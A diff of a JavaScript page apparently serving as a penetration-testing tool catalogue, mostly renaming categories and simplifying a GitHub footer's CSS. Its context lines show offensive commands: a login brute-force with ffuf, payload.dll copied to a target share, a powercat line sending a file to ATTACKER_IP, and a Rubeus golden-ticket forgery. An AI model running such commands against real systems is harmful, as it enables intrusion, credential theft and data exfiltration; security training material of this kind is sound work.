@@ -1,5 +1,5 @@
 /* ==============================================================
-   TOOL LIBRARY SCRIPT – ALL DATA IN ONE BLOCK (COLORFUL GITHUB FOOTER)
+   TOOL LIBRARY SCRIPT – ALL DATA IN ONE BLOCK (WITH GITHUB FOOTER)
    ============================================================== */
 document.addEventListener('DOMContentLoaded', function () {
   /* ----------   ELEMENTS   ---------- */
@@ -46,13 +46,13 @@ document.addEventListener('DOMContentLoaded', function () {
   /* ----------   DATA   ---------- */
   const data = [
     {
-      name: "Reconnaissance & Enumeration",
+      name: "01_recon_enum — Reconnaissance & Enumeration",
       tools: [
         {
-          cat: "wordlists",
+          cat: "wordlists/",
           items: [
             {
-              name: "big.txt",
+              name: "TEST",
               desc: "Large general-purpose wordlist",
               file: "big.txt",
               detail: `
@@ -312,7 +312,7 @@ ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=Password123"
           ]
         },
         {
-          cat: "network_utilities",
+          cat: "network_utilities/",
           items: [
             {
               name: "ncat",
@@ -634,10 +634,10 @@ proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24
       ]
     },
     {
-      name: "Gaining Initial Access",
+      name: "02_initial_access — Gaining Initial Access",
       tools: [
         {
-          cat: "client_side_attacks",
+          cat: "client_side_attacks/",
           items: [
             {
               name: "exploit.lnk, payload.dll",
@@ -676,7 +676,7 @@ cp payload.dll "\\\\target\\share\\vuln_app\\"
           ]
         },
         {
-          cat: "git_dumper",
+          cat: "git_dumper/",
           items: [
             {
               name: "gitdumper.sh",
@@ -717,7 +717,7 @@ git grep -i "password\|secret\|key"
           ]
         },
         {
-          cat: "cross_compiling",
+          cat: "cross_compiling/",
           items: [
             {
               name: "adduser.c, evil.dll",
@@ -802,7 +802,7 @@ powercat -c ATTACKER_IP -p 4444 -i file_to_send.txt
       ]
     },
     {
-      name: "AD Enumeration & Exploitation",
+      name: "03_active_directory — AD Enumeration & Exploitation",
       tools: [
         {
           cat: "Enumeration Scripts",
@@ -1074,10 +1074,10 @@ Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:H
       ]
     },
     {
-      name: " Root — Privilege Escalation",
+      name: "04_privilege_escalation — Privilege Escalation",
       tools: [
         {
-          cat: "windows",
+          cat: "windows/",
           items: [
             {
               name: "PowerUp.ps1",
@@ -1227,7 +1227,7 @@ proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24
           ]
         },
         {
-          cat: "linux",
+          cat: "linux/",
           items: [
             {
               name: "linpeas.sh",
@@ -1240,7 +1240,7 @@ proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24
                 <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                 <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                   <li>After gaining initial access to a Linux box</li>
-                  <li>When you need to elevate from low-priv user to root</li>
+                  <li>When you need to escalate from low-priv user to root</li>
                   <li>To find passwords, keys, tokens, or misconfigured services</li>
                 </ul>
                 <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
@@ -1304,7 +1304,7 @@ chmod +x LinEnum.sh
           ]
         },
         {
-          cat: "cross_platform & peas-utils",
+          cat: "cross_platform/peas-utils",
           items: [
             {
               name: "json2pdf.py",
@@ -1345,7 +1345,7 @@ python3 json2pdf.py -f winpeas.json -o report.pdf
       ]
     },
     {
-      name: "Credentials Looting — Credential Extraction",
+      name: "05_credentials_looting — Credential Extraction",
       tools: [
         {
           cat: "Credential Dumpers",
@@ -1431,7 +1431,7 @@ Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:H
       ]
     },
     {
-      name: "Reverse Engineering — Binary Analysis",
+      name: "06_reverse_engineering — Binary Analysis",
       tools: [
         {
           cat: "Tools",
@@ -1547,7 +1547,7 @@ Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:H
     }, 500);
   }, 1500);
 
-  /* ----------   GITHUB FLOATING FOOTER (COLORFUL & ANIMATED)   ---------- */
+  /* ----------   GITHUB FLOATING FOOTER   ---------- */
   // Create the GitHub footer element
   const githubFooter = document.createElement('a');
   githubFooter.href = 'https://github.com/xcode96'; // ⚠️ REPLACE THIS WITH YOUR ACTUAL GITHUB URL
@@ -1569,59 +1569,33 @@ Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:H
       right: 20px;
       background-color: #24292e;
       color: white;
-      width: 48px;
-      height: 48px;
+      width: 40px;
+      height: 40px;
       border-radius: 50%;
       display: flex;
       justify-content: center;
       align-items: center;
       text-decoration: none;
-      box-shadow: 0 4px 15px rgba(36, 41, 46, 0.6);
-      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
       z-index: 1000;
-      overflow: hidden;
-      border: 2px solid #24292e;
     }
-    .github-footer:hover,
-    .github-footer:focus {
-      transform: scale(1.1) rotate(10deg);
-      box-shadow: 0 8px 25px rgba(36, 41, 46, 0.8);
-      background: linear-gradient(135deg, #24292e, #0366d6, #28a745, #e34c26);
-      background-size: 300% 300%;
-      animation: gradientShift 3s ease infinite;
-      border-color: #0366d6;
-    }
-    .github-footer:active {
-      transform: scale(0.95) rotate(0deg);
-      box-shadow: 0 2px 10px rgba(36, 41, 46, 0.8);
+    .github-footer:hover {
+      transform: scale(1.1);
+      box-shadow: 0 4px 15px rgba(0,0,0,0.4);
     }
     .github-footer svg {
-      width: 26px;
-      height: 26px;
-      transition: transform 0.3s ease;
-    }
-    .github-footer:hover svg,
-    .github-footer:focus svg {
-      transform: scale(1.1) rotate(-10deg);
+      width: 24px;
+      height: 24px;
     }
     /* Ensure it doesn't interfere with mobile view */
     @media (max-width: 768px) {
       .github-footer {
         bottom: 15px;
         right: 15px;
-        width: 42px;
-        height: 42px;
+        width: 36px;
+        height: 36px;
       }
-      .github-footer svg {
-        width: 24px;
-        height: 24px;
-      }
-    }
-    /* Keyframe animation for gradient background */
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
     }
   `;
   document.head.appendChild(style);
@@ -1629,4 +1603,3 @@ Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:H
   // Append the footer to the body
   document.body.appendChild(githubFooter);
 });
-
